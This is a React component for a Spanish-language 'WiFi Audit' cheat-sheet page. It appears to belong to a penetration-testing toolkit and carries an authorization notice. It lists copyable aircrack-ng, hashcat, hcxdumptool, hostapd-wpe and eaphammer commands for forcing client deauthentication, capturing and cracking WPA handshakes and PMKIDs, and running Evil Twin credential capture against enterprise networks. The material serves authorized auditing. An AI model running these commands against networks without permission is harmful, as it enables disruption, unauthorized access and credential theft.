import { useState } from 'react'
import ToolShell from '../components/ToolShell'
import { Copy, Check, Shield, ChevronDown, ChevronUp } from 'lucide-react'

const COLOR = '#06b6d4'

const COMMANDS = [
  {
    cat: '📡 Preparación — Modo monitor',
    items: [
      { cmd:'iwconfig', desc:'Ver interfaces de red inalámbricas disponibles' },
      { cmd:'airmon-ng start wlan0', desc:'Activar modo monitor en wlan0 → crea wlan0mon' },
      { cmd:'airmon-ng check kill', desc:'Matar procesos que interfieren con el modo monitor (NetworkManager, etc.)' },
      { cmd:'iwconfig wlan0mon', desc:'Verificar que el modo monitor está activo' },
    ]
  },
  {
    cat: '🔍 Descubrimiento de redes',
    items: [
      { cmd:'airodump-ng wlan0mon', desc:'Listar todas las redes WiFi visibles — BSSID, canal, cifrado, clientes' },
      { cmd:'airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w captura wlan0mon', desc:'Capturar tráfico de una red específica en canal 6 — guarda en captura.cap' },
      { cmd:'wash -i wlan0mon', desc:'Listar redes con WPS habilitado (vulnerables a ataque Pixie-Dust)' },
    ]
  },
  {
    cat: '🤝 Captura de handshake WPA/WPA2',
    items: [
      { cmd:'airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 11 -w handshake wlan0mon', desc:'Capturar en el canal del AP objetivo — esperar o forzar desautenticación' },
      { cmd:'aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon', desc:'Enviar 10 paquetes de desautenticación al cliente para forzar reconexión y capturar handshake' },
      { cmd:'aircrack-ng handshake.cap | grep "WPA handshake"', desc:'Verificar que el handshake fue capturado correctamente' },
    ]
  },
  {
    cat: '🔓 Cracking de contraseña WPA',
    items: [
      { cmd:'aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt', desc:'Ataque de diccionario con rockyou al handshake capturado' },
      { cmd:'aircrack-ng handshake.cap -w /opt/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt', desc:'Wordlist específica para WPA de SecLists' },
      { cmd:'hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt', desc:'Convertir .cap a .hccapx y usar Hashcat GPU (mucho más rápido)' },
      { cmd:'aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt --bssid AA:BB:CC:DD:EE:FF', desc:'Especificar BSSID si hay múltiples redes en la captura' },
    ]
  },
  {
    cat: '⚡ PMKID Attack (sin clientes)',
    items: [
      { cmd:'hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1', desc:'Capturar PMKID directamente del AP sin necesitar cliente conectado' },
      { cmd:'hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng', desc:'Convertir captura a formato Hashcat' },
      { cmd:'hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt', desc:'Crackear PMKID con Hashcat (-m 22000)' },
    ]
  },
  {
    cat: '🏢 Enterprise WPA2 (802.1X)',
    items: [
      { cmd:'hostapd-wpe hostapd-wpe.conf', desc:'Crear AP falso Enterprise para capturar credenciales RADIUS' },
      { cmd:'eaphammer -i wlan0 -e "NombreRedEmpresa" --creds --negotiate balanced', desc:'EAPHammer — ataque Evil Twin contra redes Enterprise' },
    ]
  },
  {
    cat: '🔧 Post-captura y limpieza',
    items: [
      { cmd:'airmon-ng stop wlan0mon', desc:'Desactivar modo monitor y volver a modo managed' },
      { cmd:'service NetworkManager restart', desc:'Reiniciar NetworkManager después de la auditoría' },
      { cmd:'cap2hccapx handshake.cap handshake.hccapx', desc:'Convertir captura Aircrack (.cap) a formato Hashcat (.hccapx)' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  const copy = () => { navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(()=>setCopied(false),1500) }) }
  return (
    <button onClick={copy} style={{ padding:'4px 8px', borderRadius:6, cursor:'pointer', border:'none', transition:'all .15s', flexShrink:0,
      background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(6,182,212,0.12)', color: copied ? '#10b981' : '#06b6d4' }}>
      {copied ? <Check size={12}/> : <Copy size={12}/>}
    </button>
  )
}

export default function ToolWireless() {
  const [open, setOpen] = useState({})
  const toggle = (cat) => setOpen(o => ({ ...o, [cat]: !o[cat] }))

  return (
    <ToolShell icon="📶" name="WiFi Audit" color={COLOR} badge="Aircrack-ng · WPA2 Handshake · PMKID · Enterprise 802.1X">
      <div style={{ maxWidth:960, margin:'0 auto', padding:'32px 24px' }}>

        <div style={{ display:'flex', gap:8, padding:'11px 14px', borderRadius:9, marginBottom:18,
          background:'rgba(6,182,212,0.08)', border:'1px solid rgba(6,182,212,0.2)',
          color:'rgba(255,255,255,0.5)', fontSize:11 }}>
          <Shield size={13} style={{ color:'#06b6d4', flexShrink:0, marginTop:1 }}/>
          <span>La auditoría WiFi requiere una tarjeta de red compatible con modo monitor e inyección de paquetes (ej: Alfa AWUS036ACH). Necesitas autorización escrita para auditar redes que no sean tuyas.</span>
        </div>

        <div style={{ background:'rgba(6,182,212,0.05)', border:'1px solid rgba(6,182,212,0.15)', borderRadius:12, padding:'14px 18px', marginBottom:24 }}>
          <div style={{ color:'#22d3ee', fontWeight:700, fontSize:12, marginBottom:8 }}>🎯 Flujo de ataque WPA2 PSK</div>
          <div style={{ display:'flex', flexDirection:'column', gap:4 }}>
            {[
              '1. airmon-ng start wlan0 → activar modo monitor',
              '2. airodump-ng wlan0mon → descubrir redes (BSSID, canal)',
              '3. airodump-ng --bssid BSSID -c CANAL -w captura wlan0mon → capturar tráfico',
              '4. aireplay-ng --deauth 10 -a BSSID wlan0mon → forzar reconexión cliente',
              '5. aircrack-ng captura.cap -w rockyou.txt → crackear handshake',
            ].map((s,i) => <div key={i} style={{ color:'rgba(255,255,255,0.6)', fontSize:12, fontFamily:'monospace' }}>{s}</div>)}
          </div>
        </div>

        {COMMANDS.map(cat => (
          <div key={cat.cat} style={{ marginBottom:10, background:'rgba(255,255,255,0.02)', border:'1px solid rgba(255,255,255,0.07)', borderRadius:12, overflow:'hidden' }}>
            <button onClick={()=>toggle(cat.cat)} style={{ width:'100%', display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 16px', background:'none', border:'none', cursor:'pointer', color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:600, textAlign:'left' }}>
              {cat.cat}{open[cat.cat] ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
            </button>
            {open[cat.cat] && (
              <div style={{ padding:'0 12px 12px', display:'flex', flexDirection:'column', gap:8 }}>
                {cat.items.map((item,i) => (
                  <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                    <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginBottom:6 }}>
                      <code style={{ flex:1, fontSize:11, color:'#22d3ee', fontFamily:'monospace', lineHeight:1.5 }}>{item.cmd}</code>
                      <CopyBtn text={item.cmd}/>
                    </div>
                    <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{item.desc}</div>
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}

      </div>
    </ToolShell>
  )
}
